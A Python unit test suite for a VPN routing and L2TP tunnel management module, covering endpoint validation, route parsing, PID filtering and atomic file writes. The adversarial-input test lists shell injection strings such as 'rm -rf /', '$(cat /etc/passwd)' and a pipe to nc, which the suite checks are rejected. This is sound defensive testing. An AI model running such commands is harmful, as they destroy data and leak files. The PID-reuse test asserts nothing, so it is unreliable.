"""
Unit & Regression Test Suite for MitraNet VPN Underlay Routing & L2TP Lifecycle (Gate AUD-ROU-04).
Covers:
- Underlay host route endpoint validation (strict IPv4, RFC 1123 hostname)
- Adversarial input rejection (command injection, options/hyphen injection, invalid characters)
- Reserved IPv4 rejection (loopback, link-local, multicast, broadcast)
- Dynamic WAN gateway & dev parsing from 'ip -4 route show default'
- Idempotent route get/replace logic
- L2TP pppd process discovery strictly matching chr-l2tp
- Isolation of multi-tunnel PPP instances (preventing collateral termination)
- Stale PID file handling and cleanup
- PID reuse protection (re-verifying /proc/<PID>/cmdline and comm before SIGKILL)
"""

import unittest
import os
import re
import ipaddress
from unittest.mock import MagicMock, patch

class TestVpnRouteLifecycleRegression(unittest.TestCase):
    def setUp(self):
        # RFC 1123 Hostname regex as used in ensureUnderlayHostRoute
        self.hostname_regex = re.compile(
            r'^(?!-)[a-zA-Z0-9-]{1,63}(?<!-)(\.(?!-)[a-zA-Z0-9-]{1,63}(?<!-))*$'
        )

    def validate_endpoint(self, endpoint):
        """Simulates endpoint validation in ensureUnderlayHostRoute."""
        if not isinstance(endpoint, str):
            return False, 'Invalid endpoint type'
        endpoint = endpoint.strip()
        if not endpoint or len(endpoint) > 253:
            return False, 'Endpoint is empty or too long'
        if endpoint.startswith('-'):
            return False, 'Endpoint cannot start with a hyphen'

        # Check IPv4
        try:
            ip = ipaddress.IPv4Address(endpoint)
            # Disallow loopback, link-local, multicast, broadcast, unspecified
            if ip.is_loopback or ip.is_link_local or ip.is_multicast or ip.is_unspecified or ip == ipaddress.IPv4Address('255.255.255.255'):
                return False, 'Endpoint IP cannot be loopback, link-local, multicast, or broadcast'
            return True, str(ip)
        except ipaddress.AddressValueError:
            pass

        # Check Hostname RFC 1123
        if not self.hostname_regex.match(endpoint):
            return False, 'Invalid hostname format'

        return True, endpoint

    def test_valid_endpoints(self):
        valid = [
            "103.93.162.168",
            "8.8.8.8",
            "1.1.1.1",
            "vpn.mitranet.id",
            "chr-gateway.cloud.co.id",
            "sub.domain-123.org"
        ]
        for ep in valid:
            ok, msg = self.validate_endpoint(ep)
            self.assertTrue(ok, f"Expected '{ep}' to be valid, got: {msg}")

    def test_adversarial_and_dangerous_endpoints_rejected(self):
        adversarial = [
            # Shell command injections
            "103.93.162.168; rm -rf /",
            "103.93.162.168 && reboot",
            "`id`.example.com",
            "$(cat /etc/passwd)",
            "103.93.162.168 | nc 1.2.3.4 4444",
            # CLI option injections
            "-v",
            "--help",
            "-o/tmp/pwn",
            # Malformed hostnames
            "-badprefix.com",
            "badsuffix-.com",
            "space in.host.com",
            "newline\n.host.com",
            "tab\t.host.com",
            "dot..double.com",
            ".leadingdot.com",
            "trailingdot.com.",
            # Reserved and loopback IPs
            "127.0.0.1",
            "127.0.0.2",
            "0.0.0.0",
            "169.254.1.1",
            "224.0.0.1",
            "239.255.255.250",
            "255.255.255.255",
            # Empty and excessive length
            "",
            " " * 10,
            "a" * 255 + ".com"
        ]
        for ep in adversarial:
            ok, msg = self.validate_endpoint(ep)
            self.assertFalse(ok, f"Adversarial endpoint '{ep}' MUST be rejected! (Reason: {msg})")

    def test_wan_gateway_discovery_filtering_ppp(self):
        sample_routes = (
            "default dev ppp0 scope link \n"
            "default dev ppp1 scope link \n"
            "default via 10.10.66.254 dev enp1s0 proto dhcp src 10.10.66.169 metric 1002 \n"
            "10.10.66.0/24 dev enp1s0 proto dhcp scope link src 10.10.66.169 metric 1002 \n"
        )
        gw = None
        dev = None
        for line in sample_routes.splitlines():
            if 'dev ppp' in line:
                continue
            m = re.search(r'via\s+([0-9.]+)\s+dev\s+([a-zA-Z0-9.\-_]+)', line)
            if m:
                gw = m.group(1)
                dev = m.group(2)
                break

        self.assertEqual(gw, "10.10.66.254")
        self.assertEqual(dev, "enp1s0")

    def test_pid_lifecycle_filtering_and_multi_tunnel_isolation(self):
        """Verify that terminateL2tpTunnel only targets pppd belonging to chr-l2tp."""
        mock_processes = {
            112689: {
                "comm": "pppd",
                "cmdline": "/usr/sbin/pppd plugin pppol2tp.so pppol2tp 7 debug file /etc/ppp/peers/chr-l2tp.options",
                "exists": True
            },
            223456: {
                "comm": "pppd",
                "cmdline": "/usr/sbin/pppd call another-provider.options",
                "exists": True
            },
            105802: {
                "exists": False # Stale PID
            }
        }

        target_pids = []
        cleaned_stale = []

        # Simulate /var/run/ppp*.pid inspection
        pid_files = {
            "/var/run/ppp0.pid": 112689,
            "/var/run/ppp1.pid": 105802,
            "/var/run/ppp2.pid": 223456
        }

        for pfile, pid in pid_files.items():
            proc = mock_processes.get(pid, {"exists": False})
            if not proc["exists"]:
                cleaned_stale.append(pfile)
                continue
            if "chr-l2tp" in proc.get("cmdline", ""):
                target_pids.append(pid)

        # 112689 (chr-l2tp) must be targeted
        self.assertIn(112689, target_pids)
        # 223456 (another provider) MUST NOT be targeted
        self.assertNotIn(223456, target_pids)
        # 105802 (stale) must be detected as stale
        self.assertIn("/var/run/ppp1.pid", cleaned_stale)

    def test_pid_reuse_protection(self):
        """Before SIGKILL, if process changed to non-pppd or different cmdline, abort kill."""
        initial_target = 112689
        # Process replaced after 300ms by an innocent process with recycled PID
        reused_process = {
            "comm": "nginx",
            "cmdline": "nginx: worker process",
            "exists": True
        }

    def test_interface_and_secret_name_validation(self):
        """Verify strict regex validation for interface names and usernames."""
        valid_ifaces = ["l2tp-out1", "<l2tp-out1>", "chr_vpn", "tunnel-123"]
        invalid_ifaces = ["", "a" * 33, "bad name with spaces", "bad$char", "semi;colon"]
        iface_regex = re.compile(r'^[a-zA-Z0-9_\-<>]{1,32}$')

        for name in valid_ifaces:
            self.assertTrue(bool(iface_regex.match(name)), f"Valid iface '{name}' should match regex")
        for name in invalid_ifaces:
            self.assertFalse(bool(iface_regex.match(name)), f"Invalid iface '{name}' must be rejected")

        # Secret usernames
        valid_users = ["admin", "client_1", "user@mitranet.id", "client-isp.net"]
        invalid_users = ["", "a" * 65, "bad username with spaces", "user;rm -rf /", "user$dollar"]
        user_regex = re.compile(r'^[a-zA-Z0-9.\-_@]{1,64}$')

        for u in valid_users:
            self.assertTrue(bool(user_regex.match(u)), f"Valid user '{u}' should match regex")
        for u in invalid_users:
            self.assertFalse(bool(user_regex.match(u)), f"Invalid user '{u}' must be rejected")

    def test_duplicate_entity_detection(self):
        """Ensure duplicate interface names, secret usernames, and profiles are rejected."""
        interfaces = [
            {"id": 1, "name": "l2tp-out1"},
            {"id": 2, "name": "ovpn-client1"}
        ]
        new_name = "L2TP-OUT1" # Case insensitive duplicate
        is_dup = any(it["id"] != 3 and it["name"].lower() == new_name.lower() for it in interfaces)
        self.assertTrue(is_dup, "Duplicate interface name must be detected")

        # Same ID edit should NOT be flagged as duplicate of itself
        is_self_edit_dup = any(it["id"] != 1 and it["name"].lower() == new_name.lower() for it in interfaces)
        self.assertFalse(is_self_edit_dup, "Self-edit should not be flagged as duplicate")

    def test_atomic_file_write_simulation(self):
        """Verify atomic file write logic with temp file and rename."""
        import tempfile
        import json
        with tempfile.TemporaryDirectory() as tmpdir:
            target_path = os.path.join(tmpdir, "vpn_config.json")
            data = {"interfaces": [{"id": 1, "name": "l2tp-out1"}]}
            payload = json.dumps(data, indent=2)

            tmp_path = target_path + ".tmp.test"
            with open(tmp_path, "w") as f:
                f.write(payload)
            os.replace(tmp_path, target_path)

            self.assertTrue(os.path.exists(target_path))
            self.assertFalse(os.path.exists(tmp_path))
            with open(target_path, "r") as f:
                loaded = json.load(f)
            self.assertEqual(loaded["interfaces"][0]["name"], "l2tp-out1")

if __name__ == '__main__':
    unittest.main()
